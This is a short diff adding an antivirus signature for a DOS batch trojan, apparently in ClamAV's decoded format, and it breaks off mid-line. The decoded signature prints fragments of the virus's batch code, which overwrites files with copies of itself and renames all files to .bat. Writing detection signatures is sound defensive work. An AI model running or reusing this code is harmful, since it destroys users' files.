@@ -1,0 +1,9 @@
+VIRUS NAME: Dos.Trojan.Butter-1
+TARGET TYPE: ANY FILE
+OFFSET: *
+DECODED SIGNATURE:
+ctty nul
+for %%v in (*.*) do Set A=%%v
+copy %0 %A%
+copy *.* *.bat
+for %%w in (%wind
